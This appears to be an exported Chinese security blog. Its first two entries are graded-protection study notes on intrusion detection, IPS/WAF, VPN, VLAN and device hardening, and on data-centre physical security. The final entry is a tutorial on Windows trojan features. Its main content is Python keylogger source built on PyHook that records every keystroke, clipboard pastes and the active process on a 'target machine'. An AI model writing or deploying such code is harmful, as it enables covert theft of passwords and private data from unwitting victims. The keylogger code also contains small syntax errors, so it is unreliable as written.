恶意代码，如病毒、木马和蠕虫。 11） 拒绝服务攻击。 入侵检测系统的分类根据检测原理进行分类异常检测异常入侵检测是根据系统或用户的非正常行为或者对于计算机资源的非正常使用而检测出入侵行为的检测技术。在异常检测中，观察到的不是已知的入侵行为，而是系统运行过程中的异常现象。异常检测需要建立一个系统的正常活动状态或者用户正常行为模式的描述模型，操作时将用户当前行为模式或系统的当前状态与该正常模型进行比较，如果当前值超出了预设的阀值，则认为存在着攻击行为。 误用检测误用入侵检测系统根据已知入侵攻击的信息（知识、模式等）来检测系统中的入侵和攻击。误用检测需要对现有的各种攻击手段进行分析，建立能够代表该攻击行为的特征集合，操作时将当前数据进行处理后与这些特征集合进行匹配，如果匹配成功则说明有攻击发生。 混合检测混合检测指在考虑分析系统正常行为的同时，还观察可以的入侵行为，之后再做出检测结构判断，所以检测结果能更全面、准确和可靠。它通常根据系统的正常数据流背景来检测入侵行为，有人称其为“启发式特征检测”。 根据数据来源进行分类基于主机的入侵检测系统基于主机的入侵检测系统（Host-based Intrusion Detection System ， HIDS）通过监测主机的审计记录、系统日志、应用日志及其他辅助数据，来查找和发现攻击行为的痕迹。它可以部署在各种计算机主机上部署。 基于网络的入侵检测系统基于网络的入侵检测系统（Network-based Intrusion Detection System ，NIDS）使用网络数据包作为数据源，通常实时监视并分析通过网络的所有数据，从中获取有用的信息，再与已知攻击特征相匹配或与正常网络行为原型相比较来识别攻击事件。 混合式的入侵检测混合式入侵检测系统将基于主机的入侵检测技术与基于网络的入侵检测技术融合在一块，一方面能够对主机上的用户或进程行为进行监测，另一方面能够对网络的整体态势做出反应。在具体实现上，混合式的入侵检测主要分为两种类型，一种是基于多种监测数据源的入侵检测技术，另一种是采用多种不同类型的检测方法的入侵检测技术。 入侵检测的过程总的来说，入侵检测的过程可以分为三个阶段: 信息收集、信息分析及千警与响应。 信息收集入侵检测的第一步是信息收集，即从入侵检测系统的信息源中收集信息，包括系统、网络、数据及用户活动的状态和行为等。而且，需要在计算机网络系统中的若干不同关键点 （不同网段和不同主机） 收集信息，这除了尽可能扩大检测范围的因素外，还有一个重要的因素就是从一个源来的信息有可能看不出疑点，但从几个源来的信息的不一致性却是可疑行为或入侵的最好标识。 信息分析信息分析是入侵检测过程中的核心环节，没有信息分析功能，入侵检测也就无从谈起。 入侵检测的信息分析方法有很多，如模式匹配、统计分析、完整性分析等。每种方法都有其各自的优缺点，也都有其各自的应用对象和范围。 分析是入侵检测的核心功能，它既能简单到像一个已浏览处理日志的人去建立决策表，也能复杂到一个集成了几百万个处理的非参数系统。 告警与响应当一个攻击或事件被检测到以后，入侵检测系统就应该根据攻击或事件的类型或性质，做出相应的告警与响应，即通知管理员系统正在遭受不良的入侵， 或者采取一定的措施阻止入侵行为的继续。 入侵检测系统的部署与应用网络入侵检测系统位于有敏感数据需要保护的网络上，通过实时侦听网络数据流，寻找网络违规模式和未授权的网络访问尝试。当发现网络违规行为和未授权的网络访问时，网络监控系统能够根据系统安全策略做出反应，包括实时报警、事件登录，或执行用户自定义的安全策略等。 入侵检测系统可以部署在网络中的核心，监视并记录网络中的所有访问行为和操作，有效防止非法操作和恶意攻击。同时，入侵检测系统还可以形象地重现操作的过程，可帮助安全管理员发现网络安全的隐患 。 入侵防御系统与 WEB 应用防火墙IDS技术采用了一种预设置式、特征分析式工作原理，所以检测规则的更新总是落后于攻击手段的更新。为了弥补其不足，入侵防御系统（Intrusion Prevention System ， IPS） 与 WEB 应用防火墙 （WAF） 应运而生。 入侵防御系统入侵防御系统（IPS）是一部能够监视网络或网络设备的网络数据传输行为的计算机网络安全设备，通过串联而非旁路部署，能够实时地中断、调整或隔离一些不正常或是具有伤害性的网络数据传输行为。 对于部署在数据转发路径上的 IPS，可以根据预先设定的安全策略，对流经的每个报文进行深度检测 （协议分析跟踪、特征匹配、流量统计分析、事件关联分析等），如果一旦发现隐藏于其中的网络攻击，可以根据该攻击的威胁级别立即采取抵御措施，这些措施包括 （按照处理力度）：向管理中心告警、丢弃该报文、切断此次应用会话、切断此次 TCP 连接。 IPS 内部的技术特征包括： （1）代入式运行 只有以嵌入模式运行的 IPS 设备才能够实现实时的安全防护，实时阻拦所有可疑的数据包，并对该数据流的剩余部分进行拦截。 （2）深入分析和控制 IPS必须具有深入分析能力，以确定哪些恶意流量已经被拦截，根据攻击类型、策略等来确定哪些流量应该被拦截。 （3）入侵特征库 高质量的入侵特征库是 IPS 高效运行的必要条件，IPS 还应该定期升级入侵特征库，并快速应用到所有传感器。 （4）高效处理能力 IPS必须具有高效处理数据包的能力，对整个网络性能的影响保持在最低水平。 WEB应用防火墙WEB 应用防火墙（WAF）是通过执行一系列针对HTTP/HTTPS的安全策略来专门为WEB应用提供保护的一种技术和产品。 WAF可以阻止针对WEB的各种攻击，譬如：SQL 注入、XSS攻击、溢出攻击、挂马攻击、盗链攻击、WEB恶意扫描攻击、CSRF攻击、XML Dos攻击、CC攻击等。 WEB 防火墙产品部署在 WEB 服务器的前面，串行接入，不仅在硬件性能上要求高，而且不能影响 WEB 服务，所以往往不仅具有 HA 功能、Bypass 功能，而且还需要与负载均衡、WEB Cache 等 WEB 服务器前的常见的产品协调部署。 虚拟专用网络（VPN）技术VPN的英文全称是“Virtual Private Network”，翻译过来就是“虚拟专用网络”。顾名思义，我们可以把它理解成是虚拟出来的企业内部专线。 VPN基本概念虚拟专用网络的目的是提供一条安全的网络通道，通常是通过 Internet 的专用隧道。要达到这个目的，需要将传输内容封装在含有目的路由信息的数据包包头信中，这些信息有助于将所传输的内容送达目的地。传输内容通常会进行加密处理，这样能够保证数据的完整性、机密性和可认证性。它可以通过特殊的加密的通信协议在连接到 Internet 上的位于不同地方的两个或多个企业内部网之间建立一条专有的通信线路，就好比是架设了一条专线一样，但是它并不需要真正地去铺设光缆之类的物理线路。虚拟专用网可以帮助远程用户、公司分支机构、商业伙伴及供应商同公司的内部网建立可信的安全连接，并保证数据的安全传输。 VPN 通过一个私有的通道来创建一个安全的私有连接，将远程用户、公司分支机构、公司的业务伙伴等跟企业网连接起来，形成一个扩展的公司企业网。 网络设备安全防护VLAN划分虚拟局域网（Virtual Local Area Network ，VLAN）是一种建构于局域网交换技术（LAN Switch）的网络管理的技术，网管人员可以借此通过控制交换机有效分派出入局域网的数据包到正确的出入端口，达到对不同实体局域网中的设备进行逻辑分群 （Grouping） 管理，并降低局域网内大量数据流通时，因无用数据包过多而导致拥塞的问题，以及提升局域网的信息安全保障。 为实现交换机以太网的广播隔离 ，一种理想的解决方案就是采用虚拟局域网技术 。这种对连接到第二层交换机端口的网络用户的逻辑分段技术的实现非常灵活，它可以不受用户物理位置限制，根据用户需求进行VLAN划分；可在一个交换机上实现，也可跨交换机实现； 可以根据网络用户的位置、作用、部门或根据使用的应用程序、上层协议或者以太网连接端口的硬件地址来进行划分。 使用 VLAN 的优点包括: 1）控制广播风暴：一个VLAN就是一个逻辑广播域，通过对VLAN的创建，隔离了广播，缩小了广播范围，可以控制广播风暴的产生。 2）提高网络整体安全性：通过路由访问列表和MAC地址分配等VLAN划分原则，可以控制用户访问权限和逻辑网段大小，将不同用户群划分在不同 VLAN，从而提高交换式网络的整体性能和安全性。 3）网络管理简单、直观：对于交换式以太网，如果对某些用户重新进行网段分配，需要网络管理员对网络系统的物理结构重新进行调整 ，甚至需要追加网络设备，增大网络管理的工作量。在一个交换网络中，VLAN提供了网段和机构的弹性组合机制。 从技术角度讲，依据不同原则，VLAN的划分有以下三种方法： 1）基于端口的VLAN 划分。 2）基于 MAC 地址的 VLAN 划分。 3）基于路由的 VLAN 划分。 网络设备的访问控制网络设备访问控制的主要目的是防止非法用户进入网络设备并对其配置进行非法修改，避免网络瘫痪。 对网络设备访问的控制1）通过设置并加密口令实现访问控制：网络设备提供的最基本的安全是在设备访问和配置过程中设置登录口令。如果对设备的访问和配置不加以审查，往往会引发安全问题。例如，有些设备出厂时往往没有设置登录口令或设置一些缺省口令字，而一些管理员就利用这些缺省的口令进行管理，攻击者很容易就找到了一个入口，从而引发安 全问题。 2）对虚拟终端的访问控制：虚拟端口相对于实端口而言，一般根据需要在交换机（或路由器）上虚拟出一些端口，这些端口被称为虚拟终端或虚拟端口。每台Cisco设备一般有 5 个缺省虚拟终端，在虚拟终端线路上实施访问控制列表，可以控制谁可以远程登录 （Telnet） 到该设备。 3）对 WEB 控制台的访问控制：WEB console 是配置网络设备的另一种常用方法，具有友好的操作界面，使配置网络设备变得更加容易，但同时也引出了一些安全问题。 为了使得网络设备的管理与维护更加的便利，许多网络设备厂商都在自己的产品中实现了 HTTP 服务器，以建立一个交叉平台的、易于管理的图形化解决方案。用户可以通过 WEB 图形化界面对网络设备进行管理。多数的网络设备，拥有一整套机制来进行认证和限制 HTTP 远程访问。网络管理员必须牢记，嵌入到网络基础设施设备的 HTTP 客户机和服务器之间的通讯应当是安全的。 4）对设备的访问设置不同的权限：网络设备的 super 命令设置的口令用于低级别用户向高级别用户切换时进行验证，类似于 UNIX 系统和 Linux 系统中从普通用户转换到 root 账户时须输入 super 进行切换。网络设备的命令级别共分为 4 级，分别为访问级（0 级）、监控级（1 级）、系统级（2 级）和管理级（3 级），当低级别用户向高级别切 换时，输入命令 super [level] ，此时如果设置了网络设备的 super 的 password，则只有验证通过后切换才能实现。 5）控制会话超时及设置警示登录标语消息：如果控制台在特权模式下没有人看管，那么任何用户都可以乘机修改网络设备的配置。而对空闲会话的超时设置可以获得额外的安全保障，默认空闲会话超时时间为10分钟，可以通过 exec-timeout 命令改变会话超时时间。 利用 SNMPv3 协议来代替 SNMPv2 协议简单网络管理协议（Simple Network Management Protocol，SNMP）是一个搜集统计信息并远程监视网络基础设施设备的协议，非常简单。在 V2 版本中，其实根本没有提供任何的安全措施。那时，SNMP 协议都是通过明文传输的，包括密码在内，在网络内的传输都是明文的。所以，是非常不安全的。 为此，建议应该采用V3版本，而不要采用V2版本。因为V3解决了V2版本中的一些漏洞。特别值得强调的是在 V3 版本中，采用了MD5算法来验证SNMP管理器和代理器之间传递信息。在网络设备中，有 SNMP 两个选项，分别为只读与读写两个模式。 SSH 与 Telnet 远程管理协议在实际工作中，还是习惯通过一些远程管理协议来远程管理网络设备。如果用户需 要远程管理的话，则有 SSH 与 Telnet 两种协议可以选择。不过在选择的时候，需要注 意一个问题。Telnet 与 SSH 在安全上是相差很大的。 Telnet 是一种远程管理协议，但是，它跟 SNMPv2 版本一样，基本上没有提供可以 使用的安全机制，无论是代码，还是用户名与口令，在网络上都是明文传输的。 使用 SSH 来管理网络设备，是因为 SSH 比 Telnet 协议提供了更高的安全性。如其 口令与代码在网络中都是通过密文来传输的。 在维护各厂商的网络设备时，其性能、安全性、灵活性是日常管理工作中的三个主 要目标。故对于安全性来说，可以借鉴以上的三个建议，为网络设备提供一个安全的管 理环境。 网络设备安全配置为保证能正确地操作路由和交换机，需要进行许多配置工作。这些配置工作包括安装补丁包及对设备进行安全配置来增强安全性。再花费大量时间和步骤来打补丁和加固网络设备。 安装补丁各个网络设备厂商提供的补丁和更新程序要及时更新。 禁用多余服务路由器、交换机也像其他通用操作系统（Windows、Linux、Unix 等）一样，也有除了转发数据包之外的服务，可以禁用或保护这些服务来增强网络安全性。 1）ARP 代理：ARP 带来允许一台主机代表其他真实的主机来响应 ARP 请求，通常在防火墙上使用，用来为受保护的主机代理通信。多数厂商的路由都默认支持 ARP 代理功能，但这会使攻击者实行 ARP 欺骗攻击来对抗不在本地子网或 VLAN 中的主机。 2）其他服务：所有的路由器都提供许多服务，但如果不需要的话，可以关闭。下面是一些服务样例列表，应该根据实际环境来选择替换。我们需要知道哪些能够在网络环境中使用，哪些是默认开启的，怎么样关闭或防止未授权的人员使用。 （1）TFTP 服务。小型文件传输（Trivial File Transfer Protocol，TFTP）服务能够传输路由器系统配置文件或者上传软件更新至路由器。但是 TFTP 并不提供身份认证和授权功能，大多数管理员在需要的时候才会打开此服务。 （2）BOOTP 服务。路由器可以通过 BOOTP（Bootstrap Protocol）服务的方式来向客户端提供 DHCP 服务。而在大型企业中通常会有专用的 DHCP 服务器来提供客户端的IP地址分配工作，所以需要关闭此服务。 （3）网页服务。许多厂商的设备都默认提供了网页服务用于修改配置。如果不需要使用网页的方式管理路由器，应禁止该服务。 （4）诊断服务。大多数的路由器都开启了多个基于 UDP 或TCP 的诊断服务，类似于 Echo、Debug等。这些调试功能会占用大量资源，并且攻击者也可以通过开启复杂的网络情况下的路由调试功能来占用大量资源，以达到创建 DoS的目的。如果不是用于故障调试或测试的话，应该关闭这些服务。]]></content>
      <tags>
        <tag>等级保护</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[物理和环境安全]]></title>
    <url>%2F2019%2F10%2F08%2F%E7%89%A9%E7%90%86%E5%92%8C%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[物理和环境安全目的主要是使存放计算机、网络设备的机房及信息系统的设备和存放数据的介质等免受物理环境、自然灾害，以及人为的误操作和恶意操作等各种威胁所产生的风险。物理和环境安全是防护信息系统的最底层，缺乏物理和环境安全，其他任何安全措施都将变得毫无意义，因此物理和环境安全是信息安全建设的重要内容。 物理和环境安全是指为了保证信息系统安全可靠地运行，确保信息系统在对信息进行采集、处理、传输、存储的过程中，不至于受到人为或自然因素的危害，而使信息丢失、 油露或被破坏，对计算机设备、设施〈包括机房建筑、供电、空调等） 、环境人员、系统等采取适当的安全措施。物理和环境安全的直接保护对象是硬设备，硬设备的安全是信息系统安全的基础。 物理和环境安全要素物理资产分类物理资产指信息系统中的各种硬件、软件和物理设施，其通常的分类方式有: 1）计算机设备: 各种服务器、桌面计算机、笔记本电脑等。 2）通信设备: 路由器、交换机、防火墙等。 3）技术设备: 电源、不间断电源 〈UPS） 、空调等。 4）存储介质: 光盘、U 盘、磁带等。 5）家具及固定装置: 机柜、机架等。 6）其他。 物理和环境安全威胁信息系统物理和环境安全面临多种威胁，既可能面临自然、环境和技术故障等非人为因素的威胁，也可能面临人员失误和恶意攻击等人为因素的威胁，这些威胁通过破坏信息系统的保密性〈如电磁泄漏类威胁） 、完整性〈如各种自然灾难类威胁） 、可用性〈如技术故障类威胁）进而威胁信息的安全。造成威胁的因素可分为人为因素和环境因素。根据威胁的动机，人为因素又可分为恶意和非恶意两种；环境因素包括自然界不可抗的因素和其他物理因素。 种类 描述 自然灾害 鼠蚁虫害洪灾\地震等 电、磁环境影响 断电、电压波动静电、电磁干扰等 物理环境影响 灰尘潮湿、温度等 软硬件故障 由于设备硬件故障、通信链路中断、系统本身或软件缺陷对信息系统安全造成的影响 物理攻击 物理接触物理破坏、盗窃 无作为或操作失误 由于应该执行而没有执行相应的操作，或无意地执行了错误操作，对信息系统造成的影响 管理不到位 物理安全管理无法落实或不到位，造成物理安全管理不规范，或者管理混乱，从而破坏环境信息系统，使其正常有序地运行 恶意代码和病毒 改变物理设备的配置，甚至破坏设备硬件电路，致使物理设备失效或损坏 网络攻击 利用工具和技术，如拒绝服务等手段，非法占用系统资源，降低信息系统可用性 越权或滥用 通过采用一些措施，超越自己的权限访问了本来无权访问的资源，或者滥用自己的职权， 做出破坏信息系统的行为，如非法设备接和人、设备非法外联 设计、配置缺陷 设计阶段出现明显的系统可用性漏洞，系统未能正确有效配置、系统扩容和调整引起的错误 物理和环境安全脆弱性脆弱性是信息系统本身存在的，威胁总是要利用信息系统的脆弱性造成危害。物理设备安全的脆弱性可以从以下方面进行识别：防电磁信息泄露、抗电磁干扰、电源保护及设备振动、碰撞、冲击适应性等；物理环境安全的脆弱性可以从以下方面进行识别，机房场地选择、机房屏蔽、防火、防水、防雷、防鼠、防盗防毁、供配电系统、空调系统、综合布线、区域防护等；系统自身物理安全的脆弱性可以从以下方面进行识别：灾难备份与恢复、边界保护、设备管理、资源利用等。 物理和环境安全的要求及内容物理和环境安全保护的要求是复杂的，其基本要求包括: 1）物理位置的安全，包括机房和办公场地的位置。 2）物理访问的控制。 3）防盗窃和防破坏。 4）防雷击。 5）防火。 6）防水、防潮。 7）防静电。 8）温湿度控制。 9）电力供应。 10） 电磁防护。 物理位置选择为确保数据的安全，机房的选址是至关重要的，即必须在交通、通信便捷的地区，而且具有防震、防风、防雨等能力的建筑内。 在多层建筑或高层建筑物内的机房，宜设于第二至五层，不宜设在一层或顶层。 计算机系统受粉尘、有害气体、震动冲击、电磁场干扰等因素的影响会导致运算差错、误动作和机械部件磨损，缩短计算机使用寿命。因此机房位置应尽可能选择远离产生粉尘、有害气体、强震源、强噪声源等场所，避开强电磁场干扰。对强电磁场干扰这一因素 ，必要时需做实地测量来确定。 物理访问的控制单位需要建立机房安全管理制度，对进出机房的人员进行控制、鉴别和记录，同时对进入机房的来访人员采取申请审批，并在进入机房后进行监控和限制其活动范围。对机房的物理访问控制包括以下八个方面：1）出人机房区域的所有人员须佩戴机房出人证，无证者不能进入。 2）机房工作人员及需要长期进入机房区域工作的人员，在得到机房相关部门授权后，使用固定期限出入证出入。 3）外来人员（包括厂家工程师、参观者及其他外访人员）进入机房区域须事先预约登记，并由相关人员陪同，在批准有效期内持临时出入证出入。 4）除授权人员外，任何进入机房区域的人员须履行登记手续，按规定填写《机房出入登记表》。 5）只有与卡号登记相符的持卡人员才可以使用机房门禁卡，各持卡人未经机房管理人员同意，不得将门禁卡转借他人。 6）人员进入机房，禁止携带可能影响和威胁机房正常运行的物品，如食品和饮料，香烟，易燃易爆物品 ，电磁设备，放射性物品，以及任何照相机和录音器材等。 7）计算机等设备的出入须遵守机房移入移出设备管理规定，履行设备移人、移出的申请和登记流程。 8）进入机房区域的人员须遵守关于机房的各项规章制度。 姓名 单位 进入机房事由 进入机房授权人员签字 进入（日期/时间） 离开（日期/时间） 防盗窃和防止破坏应将主要设备放置在机房内，对机房的所有资产进行介质分类标识，形成档案或介质库进行保存。对于机房的通信线缆，应将其铺设在地下或管道中进行隐藏以兔遭到破坏。 建立机房设施与环境监控系统，对机房空调、消防、不间断电源（UPS）、供配电、门禁系统等重要设施实行全面监控。 对机房环境一般实行7x24小时集中综合监控。运行监测岗位的人员实时监控电源系统、空调系统和机房环境，定期巡检、维护场地设施，填写巡检日志，记录、处理和报告监控系统终端各种声、光告警模块发出的报警信息。 防雷击电子设备富含大量的CMOS半导体集成模块，普遍存在着绝缘强度低、过电压耐受能力差等致命弱点，一旦遭受雷击过压的冲击，会造成这些电子系统的运行中断，设备永久性损坏；重要的是这些系统所承负的那些须实时运行的后续工作的中断瘫痪所造成的不可估量的直接与间接的巨大经济损失和影响。对雷电电磁脉冲（LEMP）的防护，不但是必要的，而且是必须实施的。随着电子设备的广泛应用，雷击设备事故概率的增加及人们防雷意识的增强， 日趋显示了电涌保护器（访雷器，简称 SPD）在保障电子设备的运行安全性方面起到的作用和地位。 防雷工程分为直击雷和雷电感应两大部分。直击雷防御系统的主要作用，是捕捉雷电闪击点，保护建筑物及室外部分设备免受雷电的直接打击。直击雷防御系统的主要组成部分为接内器（如雷针、带、网）、引下线、接地装置。雷电感应防御系统的主要作用，是降低雷击时的冲击电位差和雷电电磁感应强度，保护电子设备免受雷击过电压和 雷电电磁脉冲的危害。雷电感应防御系统的主要组成部分为电磁屏蔽、电涌保护器、等电位连接。在防雷工程设计时应系统地、因地制宜地将直击雷防御和雷电感应防御有机地结合起来，才能保证整体防雷工程的有效性，因此整体防雷工程应从以下几个要素着手。 1）捕捉雷电闪击。在大楼顶部安装接闪器，让雷电按指定的途径泄放入地，避免微波接收天线等直接接受雷电流而受损。 2）雷电流的安全输送。利用引下线引导强大的雷电流安全入地。 3）雷电能量的对地安全释放。利用良好的接地网系统尽快地泄放雷电能量。降低雷电流的落地电位差，尽可能降低地电位反击能量。 4）雷电电磁波的屏蔽。利用建筑物的钢筋混凝土墙体、专用屏蔽罩及各种设备自身的金属屏蔽层，衰减雷电电磁脉冲产生的强大磁场对设备中的电子芯片的电磁危害。 5）防止雷电波通过电力线缆、通信线缆、天馈线缆及其他金属线缆对设备造成的过电压损害。利用相应的电涌保护器，在线路的入口处进行雷电能量拦截，使到达设备的雷电过电压在设备可承受的范围之内。 6）防止不同地网及相邻金属导体之间产生电位差。采用共地、等电位连接、地网均压等措施，防止雷击电位差对设备的危害。 防火必须对机房设计好消防系统，防患于未然。 火的种类火分为以下几类； A 类一一固体有机物质燃烧的火； B 类一一液体或可融化固体燃烧的火； C 类一一可燃气体燃烧的火； D 类一一轻金属燃烧的火。 灭火原理及介质常见的灭火器有干粉类的灭火器、二氧化碳灭火器、泡沫型灭火器、水型灭火器等，其灭火原理各不相同，通常包括: （1）冷却法：将灭火剂直接喷到燃烧物上，使燃烧物质的温度降低到燃点之下，而停止燃烧。 （2）隔离法：将火源处及其周围的可燃物撤离或隔开，使燃烧因与可燃物到离而停止。 （3） 塞息法：阻止空气流人燃烧区或用不燃烧物质冲淡空气，使燃烧物质得不到足够的氧气而熄灭。 （4）中断化学反应法：灭火剂参与到燃烧反应过程中，使燃烧过程产生的游离基消失，而形成稳定分子或活性的游离基，从而使燃烧的化学反应中断。 不同类别的火源，其对应的灭火介质有所区别，具体参见表 等级 类型 灭火介质 A 普通可燃物 水.苏打酸 B 液体 气体、二氧化碳；苏打酸 C 气体 气体、二氧化碳 D 可燃金属 干粉 机房灭火系统禁止采用喷水、泡沫及粉末灭火，比较适合用气体灭火系统。机房的消防系统应该是相对独立的系统，一般在大型的机房中都具备集中监控系统，系统可以准确预报火警，并且在无人值守的情况下自动启动消防灭火系统。 机房防火考虑点1）为预防来自机房外部的火灾危险,理想的情况下机房最好与其他建筑分开建设，并在建筑之间留有一定宽度的防火通道。如果机房与其他用途的房间合用一幢建 筑，根据建筑设计防火规范及机房设计规范规定，应单独设防火分区。这样可以有效地防止来自机房外部的火灾危险。在机房选址时应注意机房要远离易燃易爆物存放区域。 2）机房应为独立的防火分区，机房的外墙应采用非燃烧材料。进出机房区域的门应采用防火门或防火卷帘。穿越防火墙的送、回风管，应设防火阀。以上措施应在机房平面总体设计及相关专业设计中同步进行。 3）机房建设采用防火材料。机房内部的建筑材料应选用非燃烧材料 （A 级） 或难燃烧材料 （了级） 。 4）设置火灾报警系统。在机房设置消防信道并放置对计算机影响较小的气体灭火设备，同时建立火灾自动报警系统。对于灭火设备的摆放位置和有效期进行不定期检查，确保灭火设备的可用性。 5）设置气体灭火系统。 6）合理正确使用用电设备，制定完善的防火制度。 防水和防潮机房的房顶不允许有水管穿过，如果水管在地板穿过，则必须采取相应的保护防范措施。在机房的窗户、屋顶、墙壁设置保护措施以防止雨水的渗透。对于湿度较高的地区或季节应做好防潮处理。 为防赴空调系统漏水对机房产生的灾难性后果，须在精密空调周边安装防水坝并配备漏水检测系统和排水装置。 防静电在机房安装防静电地板，进入机房的作业人员必须配备防萝电手套。 静电防护的基本原则1）抑制或减少机房内静电荷的产生，严格控制静电源。 2）安全、可靠、及时地消除机房内产生的静电荷，避免静电荷积累。静电导电材料和静电耗散材料用泄漏法，使静电荷在一定时间内通过一定的路径汇漏到地。 3）绝缘材料用以离子静电消除器为代表的中和法，使物体上积累的静电荷吸引从空气中来的异性电荷，被中和而消除。 4）定期〈如一周） 对防静电设施进行维护和检验。 静电电压静电电压绝对值应小于 200V 地面要求1）当采用地板下布线方式时，可铺设防静电活动地板。 2）当采用架空布线方式时，应采用静电耗散材料作为铺垫材料。 其他防静电措施1）必要时装设离子静电消除器，以消除绝缘材料上的静电和降低机房内的静电电压。 2）垫套、手套均应为防静电的。 温、湿度控制在机房设置温、湿度自动调节设施，使机房温度、湿度的变化在设备运行所允许的正常范围内，并监控温、湿度自动调节设备的工作状态，在超出允许范围后自动发出警告给工作人员。 活动地板铺设在计算机机房的地面找平层上，在活动地板与建筑地面之间的空间内可以铺设连接设备的各种管线。活动地板下空间可作为静压送风风库，通过带气流分布风口的活动地板将机房空调冷风送入室内及发热设备机柜内，机房内能自由调节气流分布。 活动地板下的空间作为静压送风风库，送风温度约为14度 ，将与下层天花产生极大温差，容易在下层天花产生冷凝水。机房、电池室地板下需铺设橡塑保温板，所有接缝应整齐贴紧，达到良好的保温、节能效果，并具有足够的强度来抵御磨损，橡塑保温面层铺设镀锌钢板。 电力供应机房电气工程中的机房供配电系统是机房的生命线，因此要建一个好的机房，首先要将供配电解决好。一般要求主要开关设备应该被设计成适合增容、维护和冗余，并提供双倍的或隔离的冗余配置。设计时应该考虑到开关装置、总线或断路器维护的方便性。瞬时电压浪涌抑制 （TVSS） 应该被安装在电力分配系统的每一级上，并且采用适当的规格，以便能够抑制可能发生的瞬时的能量。 同时，为保证机房设备正常运转，在机房的供电线路上应配备稳压器和过电压防护设备； 在机房出现断电的情况下为保证设备正常运转，机房还配备了短期的备用电力〈发电机、蓄电池） 来提供超过 1 小时的供电时间，在机房的特殊区域和重要设备要单独提供UPS来供电。 对于一级负荷机房应该有从不同变电站供给的双路供电，加上柴油发电机，通过应急电源柜切换后供给机房内的 UPS 和精密空调机组，ATS 切换最好在机房配电系统就近设计，切换后以最短距离输送给机房设备。备用发电机系统是至关重要的一个因素。 即便其中有一个故障，也能够直接地向计算机和其他设备提供一个理想质量和容量的电力供应。发电机的设计应能够处理 UPS 系统或计算机设备负荷的谐波电流。备用发电机应该提供备用电源给所有的冷却设备，避免负载设备温度上升及停止运行。如果发电机不支持这些系统，它们所带来的益处就显得很有限。在自动控制发生故障时，发电机应该能够采用手动控制。应该给每一个发电机输出提供瞬时电压浪涌抑制装置。 配电必须充分考虑到今后的发展余量。如一台服务器，每台高配功率为 1kW，一个机柜若装 6 台就是 6kW，假如预期机房在今后会装到最多 40 个机柜那就是 240kW； UPS 一般可按照设备容量的 1.3 倍计算，就是 312kVA，再加上适当的余量，选用3台 200kVA UPS 冗余供电是一种较为理想的方案。 电磁防护电源线和通信线路应隔离铺设，避免互相干扰从而影响数据中心的正常运作。 主机房内无线电干扰场强，在频率为 0.15 ~ 1000MHz 时，不应大于 126dB。 在计算机系统停机条件下，主机地板表面垂直及水平向的振动加速度值每秒不应大于500mm/s 。 主机房内磁场干扰环境场强不应大于 800A/m。 主机房内绝缘体的静电电位不应大于 lkV。]]></content>
      <categories>
        <category>知识整理</category>
      </categories>
      <tags>
        <tag>等级保护</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows 下木马的常用功能]]></title>
    <url>%2F2019%2F09%2F09%2Fwindows-%E4%B8%8B%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%B8%B8%E7%94%A8%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[我们开始创建一些小功能函数。 键盘记录键盘记录器很常见。优秀的第三方python库 PyHook能让我们很容易捕获所有键盘事件。它利用了原生的windows函数SetWindowsHookEx，这个函数允许我们安装自定义钩子，当特定的windows事件发生时，这个钩子函数就会被调用。我们通过注册键盘事件的钩子函数能捕获目标机器触发的所有按键信息。除此之外，我们还需要精确的知道哪些进程中执行了这些按键。PyHook封装了所有底层编程方法，我们只需要关注键盘记录的核心逻辑。 pyhook 下载地址：https://sourceforge.net/projects/pyhook/ 12345678910111213141516171819202122232425262728293031323334353637383940from ctypes import *import pythoncomimport pyhookimport win32clipboarduser32 = windll.user32kernel32 = windll.kernel32psapi = windll.psapicurrent_window = Nonedef get_current_process(): # 获得前台窗口句柄 hwnd = user32.GetForegroundWindow() # 获得进程ID pid = c_ulong(0) user32.GetWindowThreadProcessId(hwnd, byref(pid)) # 保存当前的进程ID process_id = "%d" % pid.value # 申请内存 executable = create_string_buffer("\x00" * 512) # 自主打开进程 h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid) # 获取进程基础信息 psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512) window_title = create_string_buffer("\x00" * 512) length = user32.GetWindowTextA(hwnd, byref(window_title), 512) # 输出进程相关的信息 print print "[ PID: %s - %s -%s ] " % (process_id, executable.value, window_title.value) print # 关闭句柄 kernel32.CloseHandle(hwnd) kernel32.CloseHandle(h_process) GetForegroundWindow 返回目标桌面上当前活动窗口句柄 GetWindowThreadProcessId 获取进程id 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from ctypes import *import pythoncomimport pyhookimport win32clipboarduser32 = windll.user32kernel32 = windll.kernel32psapi = windll.psapicurrent_window = Nonedef get_current_process(): # 获得前台窗口句柄 hwnd = user32.GetForegroundWindow() # 获得进程ID pid = c_ulong(0) user32.GetWindowThreadProcessId(hwnd, byref(pid)) # 保存当前的进程ID process_id = "%d" % pid.value # 申请内存 executable = create_string_buffer("\x00" * 512) # 自主打开进程 h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid) # 获取进程基础信息 psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512) window_title = create_string_buffer("\x00" * 512) length = user32.GetWindowTextA(hwnd, byref(window_title), 512) # 输出进程相关的信息 print print "[ PID: %s - %s -%s ] " % (process_id, executable.value, window_title.value) print # 关闭句柄 kernel32.CloseHandle(hwnd) kernel32.CloseHandle(h_process) def KeyStroke(event): global current_window # 检查目标是否切换了窗口 if event.WindowName != current_window: current_window = event.WindowName get_current_process() # 检查案件是否为非常规按键（非组合按键） if event.Ascii &gt; 32 and event.Ascii &lt; 127: print chr(event.Ascii), else: # 如果是输入为【ctrl -v】, 则获得剪切板的内容 if event.Key == "V" win32clipboard.OpenClipboard() pasted_value = win32clipboard.GetClipboardData() win32clipboard.CloseClipboard() print "[PASTE] - %s" % (pasted_value), else: print "[%s]" % event.Key, return Truek1 =pyHook.HookManager()k1.KeyDown = KeyStroke# 注册键盘记录的钩子，然后永久执行k1.Hookkeyboard()pythoncom.PumpMessages() 上面是完整的键盘钩子代码。我们定义了PyHook的HookManger管理器，然后将我们自定义的回调函数KeyStroke与keyDown事件进行绑定。 